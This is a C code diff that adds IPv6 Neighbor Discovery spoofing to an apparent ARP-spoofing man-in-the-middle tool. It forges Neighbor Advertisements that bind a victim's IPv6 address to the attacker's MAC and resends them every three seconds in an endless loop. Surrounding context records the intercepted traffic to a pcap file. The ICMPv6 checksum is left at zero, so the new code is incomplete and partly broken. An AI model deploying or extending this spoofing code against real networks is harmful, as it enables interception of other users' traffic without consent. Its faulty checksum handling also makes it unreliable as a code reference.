@@ -53,7 +53,6 @@ void args_check(char *argv[], struct mitm *data)
   ft_assert(convert_mac(argv[2], data->source_mac) == true, "%s : invalid mac address(%s)", argv[0], argv[2]);
   ft_assert(convert_mac(argv[4], data->target_mac) == true, "%s : invalid mac address(%s)", argv[0], argv[4]);
   ft_assert(source_protocol == target_protocol, "Source and Target protocols do not match");
-  ft_assert(source_protocol == IPV4, "Protocol is not IPV4");
   data->ip_type = source_protocol;
   if (DEBUG)
   {
@@ -63,6 +62,11 @@ void args_check(char *argv[], struct mitm *data)
     {
       print_ipv4("Sender IP : ", (unsigned char *)&data->source_ipv4, "\n");
       print_ipv4("Target IP : ", (unsigned char *)&data->target_ipv4, "\n");
+    }
+    else if (data->ip_type == IPV6)
+    {
+      print_ipv6("Sender IP : ", (unsigned char *)&data->source_ipv6, "\n");
+      print_ipv6("Target IP : ", (unsigned char *)&data->target_ipv6, "\n");
     }
   }
 }
@@ -83,6 +87,43 @@ void make_arp_packet(unsigned char *buffer)
   cur_arp->hdr.ar_hln = 6;                   // MAC 주소 길이 (6 바이트)
   cur_arp->hdr.ar_pln = 4;                   // IPv4 주소 길이 (4 바이트)
   cur_arp->hdr.ar_op  = htons(ARPOP_REPLY);  // ARP 응답 (2)
+}
+
+void make_ndp_packet(unsigned char *buffer)
+{
+  struct ethhdr         *cur_eth = (struct ethhdr *)buffer;
+  struct ipv6_ndp_packet *cur_ipv6_ndp = (struct ipv6_ndp_packet *)(buffer + sizeof(struct ethhdr));
+
+  // Ethernet header
+  ft_memcpy(cur_eth->h_dest, data.target_mac, sizeof(data.target_mac));
+  ft_memcpy(cur_eth->h_source, data.source_mac, sizeof(data.source_mac));
+  cur_eth->h_proto = htons(ETH_P_IPV6);
+
+  // IPv6 header
+  cur_ipv6_ndp->ipv6_hdr.ip6_vfc = 0x60; // Version 6
+  cur_ipv6_ndp->ipv6_hdr.ip6_flow = 0;
+  cur_ipv6_ndp->ipv6_hdr.ip6_plen = htons(sizeof(struct ndp_packet));
+  cur_ipv6_ndp->ipv6_hdr.ip6_nxt = IPPROTO_ICMPV6;
+  cur_ipv6_ndp->ipv6_hdr.ip6_hlim = 255;
+  ft_memcpy(&cur_ipv6_ndp->ipv6_hdr.ip6_src, &data.source_ipv6, sizeof(data.source_ipv6));
+  ft_memcpy(&cur_ipv6_ndp->ipv6_hdr.ip6_dst, &data.target_ipv6, sizeof(data.target_ipv6));
+
+  // ICMPv6 NDP header
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_type = ICMPV6_ND_NA; // Neighbor Advertisement
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_code = 0;
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_cksum = 0; // Will be calculated later
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_data32[0] = htonl(0x60000000); // R=0, S=1, O=1 flags
+
+  // Target IPv6 address
+  ft_memcpy(cur_ipv6_ndp->ndp.target_ip, &data.source_ipv6, sizeof(data.source_ipv6));
+
+  // Target Link-Layer Address option
+  cur_ipv6_ndp->ndp.option_type = 2;   // Target Link-Layer Address
+  cur_ipv6_ndp->ndp.option_length = 1; // 8 bytes
+  ft_memcpy(cur_ipv6_ndp->ndp.target_mac, data.source_mac, sizeof(data.source_mac));
+
+  // Calculate ICMPv6 checksum (simplified - should use pseudo-header)
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_cksum = 0;
 }
 
 void *send_fake_arp_reply(void *arg)
@@ -116,10 +157,42 @@ void *send_fake_arp_reply(void *arg)
   return (NULL);
 }
 
+void *send_fake_ndp_reply(void *arg)
+{
+  struct sockaddr_ll dest_addr;
+  struct thread_arg *t_arg = arg;
+
+  ft_memset(&dest_addr, 0, sizeof(dest_addr));
+  dest_addr.sll_family   = AF_PACKET;
+  dest_addr.sll_protocol = htons(t_arg->protocol);
+  dest_addr.sll_ifindex  = data.if_index;
+  dest_addr.sll_halen    = ETH_ALEN;
+  ft_memcpy(dest_addr.sll_addr, t_arg->mac, ETH_ALEN);
+  while (true)
+  {
+    if (sendto(data.sockfd, t_arg->buffer, t_arg->buflen, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0)
+    {
+      perror("sendto failed");
+      exit(EXIT_FAILURE);
+    }
+    if (DEBUG)
+      printf("send IPv6 NDP okay!!\n");
+    sleep(3);
+  }
+  if (t_arg)
+  {
+    if (t_arg->buffer)
+      free(t_arg->buffer);
+    free(t_arg);
+  }
+  return (NULL);
+}
+
 void send_reply_packet(unsigned char *buffer, int buflen, __be16 protocol)
 {
   pthread_t          tid;
   struct thread_arg *arg;
+  void              *(*thread_func)(void *);
 
   arg         = malloc(sizeof(struct thread_arg));
   arg->buffer = malloc(buflen);
@@ -127,7 +200,14 @@ void send_reply_packet(unsigned char *buffer, int buflen, __be16 protocol)
   ft_memcpy(arg->mac, data.target_mac, MAC_ADDR_LEN);
   arg->buflen   = buflen;
   arg->protocol = protocol;
-  if (pthread_create(&tid, NULL, send_fake_arp_reply, (void *)arg) != 0)
+
+  // Choose thread function based on protocol
+  if (data.ip_type == IPV4)
+    thread_func = send_fake_arp_reply;
+  else
+    thread_func = send_fake_ndp_reply;
+
+  if (pthread_create(&tid, NULL, thread_func, (void *)arg) != 0)
   {
     perror("pthread_create failed");
     exit(EXIT_FAILURE);
@@ -141,11 +221,12 @@ void send_reply_packet(unsigned char *buffer, int buflen, __be16 protocol)
 
 void check_packet(unsigned char *buffer, int buflen)
 {
-  struct ethhdr     *eth    = (struct ethhdr *)buffer;
-  struct arp_packet *packet = (struct arp_packet *)(buffer + sizeof(struct ethhdr));
+  struct ethhdr *eth = (struct ethhdr *)buffer;
 
-  if (ntohs(eth->h_proto) == ETH_P_ARP)
+  if (data.ip_type == IPV4 && ntohs(eth->h_proto) == ETH_P_ARP)
   {
+    struct arp_packet *packet = (struct arp_packet *)(buffer + sizeof(struct ethhdr));
+
     if (ft_memcmp(packet->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4)) == 0 &&
         ft_memcmp(packet->sender_mac, data.target_mac, sizeof(data.target_mac)) == 0 &&
         ft_memcmp(packet->target_ip, &data.source_ipv4, sizeof(data.source_ipv4)) == 0)
@@ -170,6 +251,34 @@ void check_packet(unsigned char *buffer, int buflen)
       send_gateway_spoofing_packet(buffer, buflen);
       data.spoofing     = true;
       data.pcap_file_fd = init_pcap_file("test.pcap");
+    }
+  }
+  else if (data.ip_type == IPV6 && ntohs(eth->h_proto) == ETH_P_IPV6)
+  {
+    struct ipv6_ndp_packet *ipv6_packet = (struct ipv6_ndp_packet *)(buffer + sizeof(struct ethhdr));
+
+    // Check if it's an ICMPv6 packet
+    if (ipv6_packet->ipv6_hdr.ip6_nxt == IPPROTO_ICMPV6)
+    {
+      // Check if it's a Neighbor Solicitation for our source IP
+      if (ipv6_packet->ndp.icmp6_hdr.icmp6_type == ICMPV6_ND_NS &&
+          ft_memcmp(ipv6_packet->ndp.target_ip, &data.source_ipv6, sizeof(data.source_ipv6)) == 0)
+      {
+        if (DEBUG)
+        {
+          printf("prev_ipv6_packet!!\n");
+          print_ndp_packet(buffer);
+        }
+        make_ndp_packet(buffer);
+        if (DEBUG)
+        {
+          printf("new_ipv6_packet!!\n");
+          print_ndp_packet(buffer);
+        }
+        send_reply_packet(buffer, sizeof(struct ethhdr) + sizeof(struct ipv6_ndp_packet), ETH_P_IPV6);
+        send_gateway_ndp_request_packet(buffer, buflen);
+      }
+      // TODO: Add gateway detection for IPv6
     }
   }
 }
